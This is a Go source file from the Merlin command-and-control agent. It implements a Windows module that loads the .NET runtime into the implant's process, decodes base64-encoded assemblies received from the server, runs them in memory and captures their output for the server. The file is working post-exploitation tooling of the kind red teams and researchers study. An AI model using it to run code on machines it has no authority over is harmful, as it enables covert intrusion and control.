// +build windows

package commands

import (
	// Standard
	"encoding/base64"
	"fmt"

	"strings"

	// 3rd Party
	clr "github.com/Ne0nd0g/go-clr"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/core"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
)

// runtimeHost is the main object used to interact with the CLR to load and invoke assemblies
var runtimeHost *clr.ICORRuntimeHost

// assemblies is a list of the loaded assemblies that can be invoked
var assemblies []assembly

// redirected tracks if STDOUT/STDERR have been redirected for the CLR so that they can be captured
// and send back to the server
var redirected bool

// assembly is a structure to represent a loaded assembly that can subsequently be invoked
type assembly struct {
	name       string
	version    string
	methodInfo *clr.MethodInfo
}

// CLR is the entrypoint for Jobs that are processed to determine which CLR function should be executed
func CLR(cmd jobs.Command) jobs.Results {
	clr.Debug = core.Debug
	if len(cmd.Args) > 0 {
		switch strings.ToLower(cmd.Args[0]) {
		case "start":
			return startCLR(cmd.Args[1])
		case "list-assemblies":
			cli.Message(cli.SUCCESS, "list-assemblies command received")
			return listAssemblies()
		case "load-assembly":
			cli.Message(cli.SUCCESS, "load-assembly command received")
			return loadAssembly(cmd.Args[1:])
		case "load-clr":
			cli.Message(cli.SUCCESS, "load-clr command received")
			return startCLR(cmd.Args[1])
		case "invoke-assembly":
			cli.Message(cli.SUCCESS, "invoke-assembly command received")
			return invokeAssembly(cmd.Args[1:])
		default:
			j := jobs.Results{
				Stderr: fmt.Sprintf("unrecognized CLR command: %s", cmd.Args[0]),
			}
			return j
		}
	}
	j := jobs.Results{
		Stderr: "no arguments were provided to the CLR module",
	}
	return j
}

// startCLR loads the CLR runtime version number from Args[0] into the current process
func startCLR(runtime string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for startCLR function: %s", runtime))

	var err error
	// Redirect STDOUT/STDERR so it can be captured
	if !redirected {
		err = clr.RedirectStdoutStderr()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error redirecting STDOUT/STDERR:\n%s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}
	}

	// Load the CLR and an ICORRuntimeHost instance
	runtimeHost, err = clr.LoadCLR(runtime)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling the startCLR function:\n%s", err)
		cli.Message(cli.WARN, results.Stderr)
		return
	}
	results.Stdout = fmt.Sprintf("the %s CLR runtime was successfully loaded", runtime)
	cli.Message(cli.SUCCESS, results.Stdout)
	return
}

// loadAssembly loads an assembly into the runtimeHost's default AppDomain
func loadAssembly(args []string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for executeCommand function: %+v", args))
	if len(args) > 1 {
		var a assembly
		a.name = strings.ToLower(args[1])
		for _, v := range assemblies {
			if v.name == a.name {
				results.Stderr = fmt.Sprintf("the '%s' assembly is already loaded", a.name)
				cli.Message(cli.WARN, results.Stderr)
				return
			}
		}

		// Load the v4 runtime if there are not any runtimes currently loaded
		if runtimeHost == nil {
			r := startCLR("")
			if r.Stderr != "" {
				return r
			}
		}

		// Base64 decode Arg[1], the assembly bytes
		assembly, err := base64.StdEncoding.DecodeString(args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there  was an error decoding the Base64 string: %s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}

		// Load the assembly
		a.methodInfo, err = clr.LoadAssembly(runtimeHost, assembly)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error calling the loadAssembly function:\n%s", err)
			cli.Message(cli.WARN, results.Stderr)
			return
		}

		assemblies = append(assemblies, a)
		results.Stdout = fmt.Sprintf("successfully loaded %s into the default AppDomain", a.name)
		cli.Message(cli.SUCCESS, results.Stdout)
		return
	}
	results.Stderr = fmt.Sprintf("expected 2 arguments for the load-assembly command, received %d", len(args))
	cli.Message(cli.WARN, results.Stderr)
	return
}

// invokeAssembly executes a previously loaded assembly
func invokeAssembly(args []string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for invokeAssembly function: %+v", args))
	cli.Message(cli.NOTE, fmt.Sprintf("Invoking .NET assembly: %s", args))
	if len(args) > 0 {
		var isLoaded bool
		var a assembly
		for _, v := range assemblies {
			if v.name == strings.ToLower(args[0]) {
				isLoaded = true
				a = v
			}
		}
		if isLoaded {
			results.Stdout, results.Stderr = clr.InvokeAssembly(a.methodInfo, args[1:])
			if results.Stdout != "" {
				cli.Message(cli.SUCCESS, results.Stdout)
			}
			if results.Stderr != "" {
				cli.Message(cli.WARN, results.Stderr)
			}
			return
		}
		results.Stderr = fmt.Sprintf("the '%s' assembly is not loaded", args[0])
		cli.Message(cli.WARN, results.Stderr)
		return
	}
	results.Stderr = fmt.Sprint("expected at least 1 arguments for the invokeAssembly function, received %d", len(args))
	cli.Message(cli.WARN, results.Stderr)
	return
}

// listAssemblies enumerates the loaded .NET assemblies and returns them
func listAssemblies() (results jobs.Results) {
	results.Stdout = "Loaded Assemblies:\n"
	for _, v := range assemblies {
		results.Stdout += fmt.Sprintf("%s\n", v.name)
	}
	cli.Message(cli.SUCCESS, results.Stdout)
	return
}
